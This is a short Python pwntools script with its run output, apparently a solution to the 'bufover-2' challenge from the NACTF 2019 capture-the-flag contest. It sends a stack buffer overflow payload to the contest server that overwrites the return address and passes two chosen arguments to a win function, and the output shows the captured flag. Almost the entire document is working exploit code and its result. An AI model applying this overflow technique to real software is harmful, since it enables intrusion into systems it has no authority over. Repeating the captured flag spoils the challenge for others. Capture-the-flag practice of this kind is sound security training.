from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31184)

con.recvregex('Type something>')

payload = 'A' * 28
payload += pack(0x080491c2)
payload += 'A' * 4
payload += pack(0x14b4da55)
payload += pack(0x0)
payload += pack(0xf00db4be)
con.sendline(payload)

print con.recvall()

'''
$ python bufover-2.py
[+] Opening connection to shell.2019.nactf.com on port 31184: Done
[+] Receiving all data: Done (101B)
[*] Closed connection to shell.2019.nactf.com port 31184
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0AAAAUڴ\x14!
You win!
flag: nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
'''
